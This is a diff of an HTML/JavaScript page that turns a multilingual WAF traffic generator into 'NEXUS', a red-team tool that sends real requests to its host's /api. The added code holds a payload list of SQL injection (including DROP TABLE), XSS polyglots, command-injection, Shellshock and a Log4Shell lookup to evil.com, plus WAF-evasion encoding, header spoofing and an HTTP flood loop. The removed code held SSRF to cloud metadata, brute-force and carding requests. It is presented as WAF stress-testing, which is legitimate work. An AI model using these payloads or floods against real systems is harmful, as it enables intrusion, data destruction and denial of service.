@@ -1,305 +1,352 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WAF & Security Traffic Generator | Enterprise Edition</title>
+    <title>NEXUS | Red Team Traffic Emulator</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- ENTERPRISE THEME (Deep Slate & Neon) --- */
         :root {
-            --bg-app: #0f172a; --bg-panel: #1e293b; --bg-sidebar: #020617;
-            --border: #334155; --text-main: #f8fafc; --text-muted: #94a3b8;
-            --accent: #38bdf8; --danger: #f43f5e; --success: #10b981; --warn: #f59e0b;
-            --font: 'Inter', system-ui, sans-serif;
+            --bg: #050505; --panel: #0a0a0a; --border: #222;
+            --primary: #00ff9d; --accent: #00b8ff; --danger: #ff003c; --warn: #ffcc00;
+            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
         }
-        
-        * { box-sizing: border-box; outline: none; }
-        body { background: var(--bg-app); color: var(--text-main); font-family: var(--font); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        
-        /* Header & Stats */
-        header { height: 65px; background: var(--bg-sidebar); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 25px; }
-        .brand { font-weight: 800; font-size: 1.2rem; letter-spacing: -0.5px; color: var(--text-main); display: flex; align-items: center; gap: 10px; }
-        .brand span { color: var(--accent); }
-        .brand .tag { font-size: 0.6em; background: var(--accent); color: #000; padding: 2px 6px; border-radius: 4px; margin-left: 8px; text-transform: uppercase; }
-        
-        .stats-bar { display: flex; gap: 20px; font-size: 0.9em; }
-        .stat-item { display: flex; flex-direction: column; align-items: flex-end; }
-        .stat-val { font-weight: bold; font-family: monospace; font-size: 1.1em; }
-        .stat-lbl { font-size: 0.75em; color: var(--text-muted); text-transform: uppercase; }
-        
-        /* Layout */
-        .wrapper { display: flex; flex: 1; overflow: hidden; }
-        
-        /* Sidebar */
-        .sidebar { width: 320px; background: var(--bg-sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; overflow-y: auto; }
-        .sidebar-header { padding: 15px 20px; color: var(--text-muted); font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #1e293b; position: sticky; top: 0; background: var(--bg-sidebar); z-index: 10; }
-        
-        .module-btn { padding: 12px 20px; border-bottom: 1px solid #1e293b; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: space-between; color: var(--text-main); }
-        .module-btn:hover { background: rgba(56, 189, 248, 0.1); padding-left: 25px; }
-        .module-btn.active { border-left: 3px solid var(--accent); background: rgba(56, 189, 248, 0.05); }
-        .module-info h4 { margin: 0; font-size: 0.9rem; font-weight: 500; }
-        .module-info p { margin: 3px 0 0 0; font-size: 0.75rem; color: var(--text-muted); }
-        .play-icon { color: var(--border); font-size: 0.8rem; }
-        .module-btn:hover .play-icon { color: var(--accent); }
+        * { box-sizing: border-box; user-select: none; }
+        body { background: var(--bg); color: #ccc; font-family: var(--font-mono); margin: 0; height: 100vh; overflow: hidden; display: grid; grid-template-columns: 300px 1fr; }
 
-        /* Main Console */
-        .main { flex: 1; display: flex; flex-direction: column; background: var(--bg-app); position: relative; }
-        .console-toolbar { height: 40px; background: var(--bg-panel); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; font-family: monospace; font-size: 0.85em; color: var(--text-muted); }
+        /* SIDEBAR */
+        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 10px; }
+        .brand { font-size: 1.4rem; color: var(--primary); font-weight: 900; letter-spacing: 2px; margin-bottom: 20px; text-align: center; text-shadow: 0 0 10px rgba(0,255,157,0.3); }
         
-        .logs-container { flex: 1; overflow-y: auto; padding: 10px; font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 0.9rem; scroll-behavior: smooth; }
-        .log-entry { padding: 6px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); display: grid; grid-template-columns: 80px 60px 60px 1fr; gap: 10px; align-items: baseline; animation: slideIn 0.2s ease-out; }
-        .log-entry:hover { background: rgba(255,255,255,0.02); }
+        .control-group { margin-bottom: 20px; border: 1px solid var(--border); padding: 10px; border-radius: 4px; background: #000; }
+        .label { font-size: 0.7rem; color: #666; text-transform: uppercase; margin-bottom: 8px; display: block; font-weight: bold; }
         
-        .col-time { color: #64748b; font-size: 0.85em; }
-        .col-method { font-weight: bold; }
-        .m-GET { color: #61affe; } .m-POST { color: #49cc90; } .m-PUT { color: #fca130; } .m-DELETE { color: #f43f5e; }
-        .col-status { font-weight: bold; }
-        .s-200 { color: var(--success); } .s-403 { color: var(--danger); } .s-429 { color: var(--warn); }
-        .col-detail { color: var(--text-muted); word-break: break-all; font-size: 0.9em; }
-        .payload-highlight { color: var(--accent); }
+        .btn { 
+            width: 100%; background: #111; border: 1px solid #333; color: var(--primary); 
+            padding: 12px; font-family: var(--font-mono); cursor: pointer; transition: 0.1s; 
+            text-align: left; font-size: 0.8rem; margin-bottom: 5px; display: flex; justify-content: space-between;
+        }
+        .btn:hover { background: #1a1a1a; border-color: var(--primary); }
+        .btn:active { transform: translateY(2px); }
+        .btn-danger { color: var(--danger); border-color: #330000; }
+        .btn-danger:hover { background: #220000; border-color: var(--danger); }
+        
+        .slider-container { display: flex; align-items: center; gap: 10px; font-size: 0.8rem; }
+        input[type=range] { flex: 1; accent-color: var(--primary); }
 
-        /* Lang Switcher */
-        .lang-select { background: var(--bg-app); border: 1px solid var(--border); color: var(--text-main); padding: 5px 10px; border-radius: 6px; font-size: 0.85rem; cursor: pointer; }
+        /* MAIN DASHBOARD */
+        .main { display: grid; grid-template-rows: 60px 1fr 200px; height: 100vh; }
+        
+        /* Header Stats */
+        .header { border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
+        .stat-box { text-align: center; }
+        .stat-val { font-size: 1.2rem; font-weight: bold; color: #fff; display: block; }
+        .stat-lbl { font-size: 0.65rem; color: #666; text-transform: uppercase; }
+        .text-danger { color: var(--danger) !important; }
+        
+        /* Live Terminal */
+        .terminal { background: #000; padding: 15px; overflow-y: auto; font-size: 0.75rem; display: flex; flex-direction: column-reverse; position: relative; }
+        .terminal::before { content: "LIVE TRAFFIC STREAM"; position: absolute; top: 10px; right: 20px; color: #222; font-weight: 900; font-size: 3rem; pointer-events: none; z-index: 0; }
+        .log { position: relative; z-index: 1; margin-bottom: 2px; border-bottom: 1px solid #0a0a0a; padding: 3px 0; display: grid; grid-template-columns: 60px 50px 50px 1fr; gap: 10px; animation: fadein 0.1s; }
+        .l-time { color: #444; }
+        .l-method { font-weight: bold; }
+        .l-status { font-weight: bold; }
+        .s-200 { color: var(--primary); } .s-403 { color: var(--danger); } .s-429 { color: var(--warn); } .s-0 { color: #444; }
+        .l-payload { color: #aaa; word-break: break-all; }
+        .tag { display: inline-block; padding: 0 4px; border-radius: 2px; font-size: 0.65rem; border: 1px solid #333; margin-right: 5px; }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        /* Analytics Pane */
+        .analytics { border-top: 1px solid var(--border); background: var(--panel); padding: 15px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
+        .graph-box { border: 1px solid var(--border); background: #000; position: relative; }
+        .graph-bar { background: var(--danger); height: 100%; width: 0%; transition: width 0.2s; opacity: 0.2; }
         
-        /* RTL */
-        html[dir="rtl"] { direction: rtl; text-align: right; }
-        html[dir="rtl"] .module-btn { border-left: none; border-right: 1px solid transparent; }
-        html[dir="rtl"] .module-btn.active { border-right: 3px solid var(--accent); }
-        html[dir="rtl"] .module-btn:hover { padding-left: 20px; padding-right: 25px; }
-        
-        @media (max-width: 768px) { .wrapper { flex-direction: column; } .sidebar { width: 100%; height: 40%; } }
+        @keyframes fadein { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+
+        /* Glitch Effect */
+        .glitch { animation: glitch 1s linear infinite; }
+        @keyframes glitch { 2%, 64% { transform: translate(2px,0) skew(0deg); } 4%, 60% { transform: translate(-2px,0) skew(0deg); } 62% { transform: translate(0,0) skew(5deg); } }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="brand">
-            <i class="fa-solid fa-shield-dog"></i> Security<span>Lab</span> 
-            <span class="tag">Pro 2025</span>
-        </div>
-        
-        <div style="display:flex; align-items:center; gap:20px;">
-            <div class="stats-bar">
-                <div class="stat-item">
-                    <span class="stat-val" id="stat-total" style="color:var(--text-main)">0</span>
-                    <span class="stat-lbl" data-key="st_total">Requests</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-val" id="stat-blocked" style="color:var(--danger)">0</span>
-                    <span class="stat-lbl" data-key="st_blocked">WAF Blocks</span>
-                </div>
-            </div>
-            <select class="lang-select" id="lang-picker" onchange="setLang(this.value)">
-                <option value="tr">🇹🇷 TR</option>
-                <option value="en">🇬🇧 EN</option>
-                <option value="fr">🇫🇷 FR</option>
-                <option value="ar">🇸🇦 AR</option>
-            </select>
-        </div>
-    </header>
+<div class="sidebar">
+    <div class="brand">NEXUS <span style="font-size:0.5em; vertical-align:middle; color:#666;">v3.0</span></div>
+    
+    <div class="control-group">
+        <span class="label">Attack Vectors (WAF Stress)</span>
+        <button class="btn" onclick="engine.startBatch('SQLi')">
+            <span>SQL INJECTION</span> <i class="fa-solid fa-database"></i>
+        </button>
+        <button class="btn" onclick="engine.startBatch('XSS')">
+            <span>XSS POLYGLOT</span> <i class="fa-solid fa-code"></i>
+        </button>
+        <button class="btn" onclick="engine.startBatch('RCE')">
+            <span>RCE / SHELLSHOCK</span> <i class="fa-solid fa-terminal"></i>
+        </button>
+        <button class="btn" onclick="engine.startBatch('LFI')">
+            <span>PATH TRAVERSAL</span> <i class="fa-solid fa-folder-open"></i>
+        </button>
+    </div>
 
-    <div class="wrapper">
-        <div class="sidebar" id="sidebar-modules">
-            </div>
+    <div class="control-group">
+        <span class="label">Volumetric (Rate Limit)</span>
+        <div class="slider-container">
+            <span>Concurrency:</span>
+            <input type="range" id="concurrency" min="1" max="20" value="5" oninput="document.getElementById('c-val').innerText=this.value">
+            <span id="c-val" style="color:var(--primary)">5</span>
+        </div>
+        <button class="btn btn-danger" id="btn-flood" onclick="engine.toggleFlood()">
+            <span id="flood-txt">START HTTP FLOOD</span> <i class="fa-solid fa-bolt"></i>
+        </button>
+    </div>
 
-        <div class="main">
-            <div class="console-toolbar">
-                <span><i class="fa-solid fa-terminal"></i> LIVE TRAFFIC MONITOR</span>
-                <span id="status-text">IDLE</span>
-            </div>
-            <div class="logs-container" id="log-window">
-                <div class="log-entry" style="color:#666; display:block; text-align:center; padding-top:50px;">
-                    <i class="fa-solid fa-wifi" style="font-size:2em; margin-bottom:10px;"></i><br>
-                    System Ready. Select an attack module to generate traffic.
-                </div>
-            </div>
+    <div class="control-group">
+        <span class="label">Evasion Techniques</span>
+        <div style="font-size:0.7rem; color:#888; margin-bottom:10px;">
+            <input type="checkbox" id="opt-poly" checked> Polymorphism (Case/Char)<br>
+            <input type="checkbox" id="opt-encode"> Double URL Encode<br>
+            <input type="checkbox" id="opt-null"> Null Byte Injection
+        </div>
+    </div>
+</div>
+
+<div class="main">
+    <div class="header">
+        <div class="stat-box">
+            <span class="stat-lbl">TARGET HOST</span>
+            <span class="stat-val" style="font-size:1rem; color:var(--accent)" id="target-host">...</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-lbl">TOTAL REQUESTS</span>
+            <span class="stat-val" id="stat-total">0</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-lbl">WAF BLOCKS (403)</span>
+            <span class="stat-val text-danger" id="stat-blocked">0</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-lbl">THROUGHPUT (RPS)</span>
+            <span class="stat-val" id="stat-rps">0</span>
         </div>
     </div>
 
+    <div class="terminal" id="terminal">
+        </div>
+
+    <div class="analytics">
+        <div style="color:#666; font-size:0.7rem;">
+            <strong>STATUS:</strong> <span id="engine-status" style="color:var(--primary)">IDLE</span><br>
+            <strong>LAST VECTOR:</strong> <span id="last-vector">-</span><br>
+            <strong>LATENCY:</strong> <span id="last-latency">0ms</span>
+        </div>
+        <div class="graph-box" title="Block Rate">
+            <div id="bar-block-rate" class="graph-bar"></div>
+            <span style="position:absolute; top:5px; left:5px; font-size:0.6rem; color:#fff;">BLOCK RATE</span>
+        </div>
+        <div style="color:#666; font-size:0.7rem;">
+            <i class="fa-solid fa-circle-info"></i> This tool generates <strong>real</strong> HTTP traffic using Fetch API.<br>
+            <i class="fa-solid fa-triangle-exclamation"></i> Requests originate from <strong>Client IP</strong>.
+        </div>
+    </div>
+</div>
+
 <script>
-    /* --- 1. EXPERT CONFIGURATION & PAYLOADS --- */
-    const BASE_TARGET = window.location.origin + "/api"; // Targets the site itself
+/**
+ * NEXUS ENGINE - Advanced Client-Side Traffic Generator
+ * Capabilities: Concurrency, Polymorphism, Evasion, Real-time Metrics
+ */
 
-    const modules = [
-        // === OWASP WEB TOP 10 ===
-        { id: 'a01', cat: 'web', icon: 'fa-id-badge', tr: {t:'Broken Access (IDOR)', d:'Admin ID 1 erişimi'}, en: {t:'Broken Access (IDOR)', d:'Access Admin ID 1'} },
-        { id: 'a02', cat: 'web', icon: 'fa-credit-card', tr: {t:'Cryptographic Fail', d:'Şifresiz CC gönder'}, en: {t:'Cryptographic Fail', d:'Send Cleartext CC'} },
-        { id: 'a03', cat: 'web', icon: 'fa-database', tr: {t:'Injection (SQLi)', d:'UNION SELECT saldırısı'}, en: {t:'Injection (SQLi)', d:'UNION SELECT Attack'} },
-        { id: 'a04', cat: 'web', icon: 'fa-compass-drafting', tr: {t:'Insecure Design', d:'Logic Bypass (Kupon)'}, en: {t:'Insecure Design', d:'Logic Bypass (Coupon)'} },
-        { id: 'a05', cat: 'web', icon: 'fa-gears', tr: {t:'Misconfiguration', d:'Default dosya tara'}, en: {t:'Misconfiguration', d:'Scan Default Files'} },
-        { id: 'a06', cat: 'web', icon: 'fa-box-open', tr: {t:'Vuln. Components', d:'Eski jQuery çağır'}, en: {t:'Vuln. Components', d:'Call Old jQuery'} },
-        { id: 'a07', cat: 'web', icon: 'fa-unlock', tr: {t:'Auth Failures', d:'Brute Force Login'}, en: {t:'Auth Failures', d:'Brute Force Login'} },
-        { id: 'a08', cat: 'web', icon: 'fa-file-code', tr: {t:'Integrity Fail', d:'Malicious Upload'}, en: {t:'Integrity Fail', d:'Malicious Upload'} },
-        { id: 'a09', cat: 'web', icon: 'fa-eraser', tr: {t:'Logging Failures', d:'Log silme isteği'}, en: {t:'Logging Failures', d:'Log Delete Req'} },
-        { id: 'a10', cat: 'web', icon: 'fa-server', tr: {t:'SSRF', d:'Cloud Metadata Çek'}, en: {t:'SSRF', d:'Fetch Cloud Metadata'} },
+const TARGET_BASE = window.location.origin + "/api"; // Hedef Endpoint (Netlify Functions veya Mock)
+document.getElementById('target-host').innerText = window.location.hostname;
 
-        // === API SECURITY ===
-        { id: 'api1', cat: 'api', icon: 'fa-users-viewfinder', tr: {t:'BOLA / IDOR', d:'ID Enumeration'}, en: {t:'BOLA / IDOR', d:'ID Enumeration'} },
-        { id: 'api2', cat: 'api', icon: 'fa-key', tr: {t:'Broken Auth', d:'No-Token Request'}, en: {t:'Broken Auth', d:'No-Token Request'} },
-        { id: 'api3', cat: 'api', icon: 'fa-user-tag', tr: {t:'Mass Assignment', d:'Admin Role Injection'}, en: {t:'Mass Assignment', d:'Admin Role Injection'} },
-        { id: 'api4', cat: 'api', icon: 'fa-burst', tr: {t:'Rate Limit (DoS)', d:'High Volume Flood'}, en: {t:'Rate Limit (DoS)', d:'High Volume Flood'} },
-        { id: 'api5', cat: 'api', icon: 'fa-ban', tr: {t:'BFLA', d:'Unauthorized DELETE'}, en: {t:'BFLA', d:'Unauthorized DELETE'} },
+// --- 1. PAYLOAD DATABASE (WAF KILLERS) ---
+const PAYLOADS = {
+    'SQLi': [
+        "' OR '1'='1", 
+        "1 UNION SELECT null,@@version,null --", 
+        "admin' --", 
+        "1; DROP TABLE users", 
+        "' OR 1=1 /*", 
+        "1' OR '1'='1' -- "
+    ],
+    'XSS': [
+        "<script>alert(document.domain)</script>", 
+        "<img src=x onerror=alert(1)>", 
+        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "<svg/onload=alert(1)>"
+    ],
+    'RCE': [
+        "; cat /etc/passwd", 
+        "| whoami", 
+        "() { :;}; /bin/bash -c 'sleep 5'", 
+        "${jndi:ldap://evil.com/x}"
+    ],
+    'LFI': [
+        "../../../../etc/passwd", 
+        "..%2F..%2F..%2Fwindows%2Fwin.ini", 
+        "/var/log/apache/access.log"
+    ]
+};
+
+// --- 2. ENGINE CORE ---
+const engine = {
+    stats: { total: 0, blocked: 0, startTime: 0 },
+    isFlooding: false,
+    rpsInterval: null,
+
+    // Yardımcı: Rastgele büyük/küçük harf (WAF Regex Bypass için)
+    polymorph: (str) => {
+        if(!document.getElementById('opt-poly').checked) return str;
+        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+    },
+
+    // Yardımcı: Evasion Encoding
+    encode: (str) => {
+        let res = str;
+        if(document.getElementById('opt-encode').checked) res = encodeURIComponent(encodeURIComponent(res));
+        if(document.getElementById('opt-null').checked) res = res + '%00';
+        return res;
+    },
+
+    // Tekil Saldırı İsteği
+    async sendReq(vector, payload) {
+        const finalPayload = this.encode(this.polymorph(payload));
+        const start = performance.now();
         
-        // === AUTOMATED THREATS ===
-        { id: 'oat1', cat: 'oat', icon: 'fa-money-check', tr: {t:'Carding Bot', d:'CC Validation Attack'}, en: {t:'Carding Bot', d:'CC Validation Attack'} },
-        { id: 'oat2', cat: 'oat', icon: 'fa-address-book', tr: {t:'Account Enum', d:'User Discovery'}, en: {t:'Account Enum', d:'User Discovery'} },
-        { id: 'oat3', cat: 'oat', icon: 'fa-passport', tr: {t:'Credential Stuffing', d:'Leaked DB Login'}, en: {t:'Credential Stuffing', d:'Leaked DB Login'} },
-        { id: 'oat4', cat: 'oat', icon: 'fa-spider', tr: {t:'Scraping Bot', d:'Rapid Data Extraction'}, en: {t:'Scraping Bot', d:'Rapid Data Extraction'} },
-        { id: 'oat5', cat: 'oat', icon: 'fa-meteor', tr: {t:'L7 DDoS', d:'Application Stress'}, en: {t:'L7 DDoS', d:'Application Stress'} }
-    ];
-
-    const translations = {
-        tr: { cat_web: "WEB GÜVENLİĞİ", cat_api: "API GÜVENLİĞİ", cat_oat: "BOT & OTOMASYON", st_total: "TOPLAM İSTEK", st_blocked: "ENNELLENEN (403)" },
-        en: { cat_web: "WEB SECURITY", cat_api: "API SECURITY", cat_oat: "BOT & AUTOMATION", st_total: "TOTAL REQ", st_blocked: "BLOCKED (403)" },
-        fr: { cat_web: "SÉCURITÉ WEB", cat_api: "SÉCURITÉ API", cat_oat: "BOTS", st_total: "TOTAL", st_blocked: "BLOQUÉ" },
-        ar: { cat_web: "أمن الويب", cat_api: "أمن API", cat_oat: "الروبوتات", st_total: "مجموع الطلبات", st_blocked: "محظور" }
-    };
-
-    let stats = { total: 0, blocked: 0 };
-    let currentLang = localStorage.getItem('lang') || 'tr';
-
-    /* --- 2. ATTACK LOGIC (REAL TRAFFIC) --- */
-    async function executeAttack(id) {
-        updateStatus(`EXECUTING: ${id.toUpperCase()}...`);
+        // Hedef URL'yi kirletme (Query Based Attack)
+        const url = `${TARGET_BASE}/${vector.toLowerCase()}?q=${finalPayload}&t=${Date.now()}`;
         
-        // A03: SQL Injection
-        if(id === 'a01') await sendReq('/users/1', 'GET'); // IDOR
-        if(id === 'a02') await sendReq('/pay', 'POST', {cc:'4111111111111111', cvv:'123'}); // Cleartext
-        if(id === 'a03') await sendReq('/search?q='+encodeURIComponent("' UNION SELECT 1, version() --"), 'GET'); // SQLi
-        if(id === 'a04') await sendReq('/cart/checkout', 'POST', {coupon:'DEV_100_OFF'}); // Logic
-        if(id === 'a05') await sendReq('/.git/config', 'GET'); // Misconfig
-        if(id === 'a06') await sendReq('/assets/jquery-1.6.js', 'GET'); // Old Component
-        if(id === 'a07') { for(let i=0; i<3; i++) await sendReq('/login', 'POST', {u:'admin', p:'123456'}); } // Brute Force
-        if(id === 'a08') await sendReq('/upload', 'POST', {file:'shell.php.jpg'}); // Integrity
-        if(id === 'a09') await sendReq('/admin/logs', 'DELETE'); // Logging
-        if(id === 'a10') await sendReq('/proxy?url=http://169.254.169.254/latest', 'GET'); // SSRF
+        this.stats.total++;
+        this.updateUI();
 
-        if(id === 'api1') { for(let i=1000; i<1005; i++) await sendReq(`/users/${i}`, 'GET'); } // BOLA
-        if(id === 'api2') await sendReq('/dashboard', 'GET', null, {'Authorization':'None'}); // Broken Auth
-        if(id === 'api3') await sendReq('/profile', 'POST', {role:'ADMIN', is_root:true}); // Mass Assign
-        if(id === 'api4') { for(let i=0; i<10; i++) fetch(BASE_TARGET + '/flood?t='+Date.now()); updateStats(10,0); addLog('GET', '/flood (x10)', 429, 'DoS Flood'); } // DoS
-        if(id === 'api5') await sendReq('/admin/users', 'DELETE'); // BFLA
-
-        if(id === 'oat1') { for(let i=0; i<3; i++) await sendReq('/validate-cc', 'POST', {cc:'450000000000'+i}); } // Carding
-        if(id === 'oat2') await sendReq('/recover', 'POST', {email:'admin@corp.com'}); // Enumeration
-        if(id === 'oat3') await sendReq('/login', 'POST', {user:'leaked', pass:'pass123'}); // Stuffing
-        if(id === 'oat4') { for(let i=0; i<5; i++) await sendReq(`/product/${i}`, 'GET'); } // Scraping
-        if(id === 'oat5') { for(let i=0; i<15; i++) fetch(BASE_TARGET + '/heavy'); updateStats(15,0); addLog('GET', '/heavy (x15)', 0, 'L7 Stress'); } // DDoS
-
-        updateStatus('IDLE');
-    }
-
-    async function sendReq(path, method, body=null, headers={}) {
-        const url = BASE_TARGET + path;
-        const opts = {
-            method: method,
-            headers: { 'Content-Type': 'application/json', ...headers }
-        };
-        if(body && method !== 'GET') opts.body = JSON.stringify(body);
-
-        let status = 0;
         try {
-            const res = await fetch(url, opts);
-            status = res.status;
-        } catch(e) { status = 0; } // Network Error / WAF Drop
-
-        // Update Stats
-        stats.total++;
-        if(status === 403 || status === 0) stats.blocked++;
-        updateUIStats();
-
-        // Add Log
-        const payloadStr = body ? JSON.stringify(body) : (path.includes('?') ? path.split('?')[1] : '-');
-        addLog(method, path, status, payloadStr);
-    }
-
-    /* --- 3. UI RENDERING --- */
-    function init() {
-        document.getElementById('lang-picker').value = currentLang;
-        renderSidebar();
-        updateTexts();
-    }
-
-    function setLang(l) {
-        currentLang = l;
-        localStorage.setItem('lang', l);
-        document.documentElement.lang = l;
-        document.documentElement.dir = l === 'ar' ? 'rtl' : 'ltr';
-        renderSidebar();
-        updateTexts();
-    }
-
-    function renderSidebar() {
-        const sb = document.getElementById('sidebar-modules');
-        sb.innerHTML = '';
-        
-        const cats = ['web', 'api', 'oat'];
-        const t = translations[currentLang] || translations['en'];
-
-        cats.forEach(cat => {
-            const header = document.createElement('div');
-            header.className = 'sidebar-header';
-            header.innerText = t['cat_'+cat];
-            sb.appendChild(header);
-
-            modules.filter(m => m.cat === cat).forEach(m => {
-                const txt = m[currentLang] || m['en'];
-                const btn = document.createElement('div');
-                btn.className = 'module-btn';
-                btn.onclick = () => executeAttack(m.id);
-                btn.innerHTML = `
-                    <div class="module-info">
-                        <h4><i class="fa-solid ${m.icon}" style="margin-right:8px; color:var(--accent)"></i>${txt.t}</h4>
-                        <p>${txt.d}</p>
-                    </div>
-                    <i class="fa-solid fa-play play-icon"></i>
-                `;
-                sb.appendChild(btn);
+            const res = await fetch(url, { 
+                method: 'GET', // Bazı WAF'lar GET'te Query String'i daha sert tarar
+                cache: 'no-store',
+                headers: {
+                    'X-Forwarded-For': '127.0.0.1', // Header Poisoning
+                    'User-Agent': 'Nexus/3.0 Security Scanner'
+                }
             });
-        });
-    }
+            
+            const duration = Math.round(performance.now() - start);
+            const isBlocked = res.status === 403 || res.status === 406 || res.status === 500;
+            
+            if(isBlocked) this.stats.blocked++;
+            
+            this.log(vector, res.status, finalPayload, duration);
+            document.getElementById('last-latency').innerText = duration + 'ms';
 
-    function addLog(method, url, status, detail) {
-        const box = document.getElementById('log-window');
+        } catch(e) {
+            // Network Error (WAF Connection Reset/Drop)
+            this.stats.blocked++;
+            this.log(vector, 0, finalPayload, 0);
+        }
+    },
+
+    // Batch (Parti) Gönderici - Concurrency Ayarına Göre
+    async startBatch(vector) {
+        const payloads = PAYLOADS[vector];
+        if(!payloads) return;
+        
+        document.getElementById('engine-status').innerText = `ATTACKING: ${vector}`;
+        document.getElementById('last-vector').innerText = vector;
+
+        const concurrency = parseInt(document.getElementById('concurrency').value);
+        const promises = [];
+
+        // Her payload için Concurrency kadar istek oluştur
+        payloads.forEach(p => {
+            for(let i=0; i<concurrency; i++) {
+                promises.push(this.sendReq(vector, p));
+            }
+        });
+
+        await Promise.allSettled(promises);
+        document.getElementById('engine-status').innerText = "IDLE";
+    },
+
+    // Flood Loop
+    toggleFlood() {
+        const btn = document.getElementById('flood-txt');
+        if(this.isFlooding) {
+            this.isFlooding = false;
+            btn.innerText = "START HTTP FLOOD";
+            document.getElementById('engine-status').innerText = "IDLE";
+        } else {
+            this.isFlooding = true;
+            btn.innerText = "STOPPING..."; // Geçiş efekti
+            setTimeout(() => btn.innerText = "FLOOD ACTIVE", 200);
+            document.getElementById('engine-status').innerText = "FLOODING";
+            this.floodLoop();
+        }
+    },
+
+    async floodLoop() {
+        const concurrency = parseInt(document.getElementById('concurrency').value);
+        while(this.isFlooding) {
+            const batch = [];
+            for(let i=0; i<concurrency; i++) {
+                // Rastgele bir vektör ve payload seç
+                const vecKeys = Object.keys(PAYLOADS);
+                const vec = vecKeys[Math.floor(Math.random() * vecKeys.length)];
+                const p = PAYLOADS[vec][Math.floor(Math.random() * PAYLOADS[vec].length)];
+                batch.push(this.sendReq(vec, p));
+            }
+            await Promise.allSettled(batch);
+            await new Promise(r => setTimeout(r, 50)); // Browser'ın kilitlenmemesi için mikro mola
+        }
+    },
+
+    // UI Güncellemeleri
+    log(method, status, payload, ms) {
+        const term = document.getElementById('terminal');
         const row = document.createElement('div');
-        row.className = 'log-entry';
+        row.className = 'log';
         
         let sClass = 's-200';
-        if(status === 403 || status === 0) sClass = 's-403';
-        if(status === 429) sClass = 's-429';
+        if(status === 403) sClass = 's-403'; // Blocked
+        if(status === 429) sClass = 's-429'; // Rate Limit
+        if(status === 0) sClass = 's-0';     // Dropped
 
+        const displayPayload = payload.length > 40 ? payload.substring(0,40)+'...' : payload;
+        
         row.innerHTML = `
-            <span class="col-time">${new Date().toLocaleTimeString()}</span>
-            <span class="col-method m-${method}">${method}</span>
-            <span class="col-status ${sClass}">${status === 0 ? 'ERR' : status}</span>
-            <span class="col-detail">${url} <span class="payload-highlight">${detail}</span></span>
+            <span class="l-time">${new Date().toLocaleTimeString().split(' ')[0]}</span>
+            <span class="l-method">GET</span>
+            <span class="l-status ${sClass}">${status === 0 ? 'DROP' : status}</span>
+            <div class="l-payload">
+                <span class="tag">${method}</span>${displayPayload}
+            </div>
         `;
         
-        // Clear initial msg if exists
-        if(box.children[0] && box.children[0].style.textAlign === 'center') box.innerHTML = '';
-        box.prepend(row);
-    }
+        // Terminal 100 satırda kalsın
+        if(term.children.length > 100) term.lastElementChild.remove();
+        term.prepend(row);
+    },
 
-    function updateUIStats() {
-        document.getElementById('stat-total').innerText = stats.total;
-        document.getElementById('stat-blocked').innerText = stats.blocked;
+    updateUI() {
+        document.getElementById('stat-total').innerText = this.stats.total;
+        document.getElementById('stat-blocked').innerText = this.stats.blocked;
+        
+        // Block Rate Bar
+        const rate = this.stats.total > 0 ? (this.stats.blocked / this.stats.total) * 100 : 0;
+        document.getElementById('bar-block-rate').style.width = rate + '%';
     }
-    
-    function updateStatus(msg) {
-        document.getElementById('status-text').innerText = msg;
-    }
+};
 
-    function updateTexts() {
-        const t = translations[currentLang] || translations['en'];
-        document.querySelectorAll('[data-key]').forEach(el => {
-            el.innerText = t[el.getAttribute('data-key')] || el.innerText;
-        });
+// RPS Hesaplayıcı
+setInterval(() => {
+    if(engine.stats.startTime === 0) engine.stats.startTime = Date.now();
+    const diff = (Date.now() - engine.stats.startTime) / 1000;
+    if(diff > 1) {
+        const rps = Math.round(engine.stats.total / diff);
+        document.getElementById('stat-rps').innerText = rps;
+        // Reset per 10 sec to keep RPS current
+        if(diff > 10) { engine.stats.total = 0; engine.stats.blocked = 0; engine.stats.startTime = Date.now(); }
     }
+}, 1000);
 
-    window.onload = init;
 </script>
 </body>
 </html>
